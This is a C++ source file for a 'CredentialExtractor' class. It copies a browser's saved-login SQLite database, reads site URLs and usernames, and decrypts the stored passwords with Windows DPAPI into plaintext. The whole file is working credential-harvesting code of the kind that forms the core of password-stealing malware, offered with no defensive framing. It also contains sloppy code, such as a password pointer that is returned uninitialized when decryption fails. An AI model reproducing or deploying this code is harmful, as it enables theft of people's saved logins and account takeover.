#include "CredentialExtractor.h"
#include <windows.h>
#include <Wincrypt.h>
#include <cstdlib>
#include <stdio.h>
#include "sqlite3.h"
#include <iostream>

sqlite3* DataBase;
using namespace std;
CredentialExtractor::CredentialExtractor(const char* loginDataPath, const char* copyPath)
{
    //If copyPath is not the same as loginDataPath
    if(strcmp(loginDataPath,copyPath))
    {
        if(!CopyFile(loginDataPath,copyPath,FALSE))
        {
            cout << "Error copying file: " << GetLastError() << endl;
        }
    }
    if(sqlite3_open(copyPath, &DataBase) != SQLITE_OK)
    {
        cout << "Error opening library" << endl;
    }
}

CredentialExtractor::~CredentialExtractor()
{
    sqlite3_close(DataBase);
}

int CredentialExtractor::CountCredentials()
{
    int rows = 0;
    sqlite3_exec(DataBase, "SELECT COUNT(*) FROM logins",
           [] (void *rowsPointer, int argc, char **argv, char **azColName) -> int
           {

               char* rowCount = argv[0];
               int* rows = static_cast<int*>(rowsPointer);
               *rows = atoi(rowCount);
               return 0;

           },
           &rows, NULL);
    return rows;
    //NB Sql tables are indexed from 1!
}

char* CredentialExtractor::DecryptPassword(int row)
{
    char* password;
    sqlite3_blob* blobHandle;
    if(sqlite3_blob_open(DataBase,"main","logins","password_value",row,0,&blobHandle) == SQLITE_OK)
    {
        int blobSize = sqlite3_blob_bytes(blobHandle);
        BYTE* blobData = new BYTE[blobSize];
        if(sqlite3_blob_read(blobHandle,blobData,blobSize,0) == SQLITE_OK)
        {
            DATA_BLOB cryptBlob;
            cryptBlob.pbData = blobData;
            blobData = 0;
            DATA_BLOB decryptBlob;
            cryptBlob.cbData = blobSize;
            if(CryptUnprotectData(&cryptBlob,NULL,NULL,NULL,NULL,0,&decryptBlob))
            {
                password = new char[decryptBlob.cbData+1];
                memcpy(password,decryptBlob.pbData,decryptBlob.cbData); // Copy the data from the decrypted blob to string
                password[decryptBlob.cbData] = '\0';                    // Terminate string
            }
            delete[] cryptBlob.pbData;
            LocalFree(decryptBlob.pbData);
        }
    }
    sqlite3_blob_close(blobHandle);
    return password;
}

Credential CredentialExtractor::GetCredential(int row)
{
    Credential credential;
    int rowDigits = 0;
    int n = row;
    while (n != 0)
    {
        n /= 10; rowDigits++;
    }  //Calculate the number of digits NB '0' has 0 digits
    char* sql = new char[60+rowDigits];  //TODO fix magic number
    sprintf(sql,"SELECT origin_url,username_value FROM logins WHERE _rowid_=%d",row);
    sqlite3_exec(DataBase,
                 sql,
                 [] (void *credentialPointer, int argc, char **argv, char **azColName) -> int
                 {
                     Credential *credential = (Credential*)credentialPointer;
                     //Allocate memory for strings and copy in values
                     credential->originUrl = new char[strlen(argv[0])+1];
                     strcpy(credential->originUrl,const_cast<char*>(argv[0]));
                     credential->username = new char[strlen(argv[1])+1];
                     strcpy(credential->username,const_cast<char*>(argv[1]));
                     return 0;
                     //TODO handle unexpected results from the database query
                 },
                 &credential,
                 NULL
    );
    credential.password = DecryptPassword(row);
    return credential;
}
